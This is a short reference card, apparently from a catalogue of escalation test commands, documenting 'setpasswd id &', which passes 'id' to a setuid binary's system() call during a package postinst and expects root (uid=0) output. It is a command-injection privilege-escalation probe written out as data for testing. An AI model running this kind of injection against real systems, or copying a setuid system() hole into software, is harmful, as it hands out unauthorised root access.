---
id: cmd-006
data: setpasswd id &
tags:
  - escalation-test
type: command
output: Output of 'id' command showing root privileges
executor: bash
platforms:
  - Linux
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T17:30:58.208Z'
verified: false
validated: true
submitted: true
---
# setpasswd-id-background

## Command

```bash
setpasswd id &
```

## Description

Executes the setuid binary with 'id' in background to test root escalation during postinst.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| id | Command to run via system() | Yes |
| & | Background execution | Yes |

## Examples

### Basic Usage

```bash
setpasswd id &
```

## Expected Output

uid=0(root) gid=0(root) groups=0(root).

## Related

- [[commands/setpasswd-id-execute]]
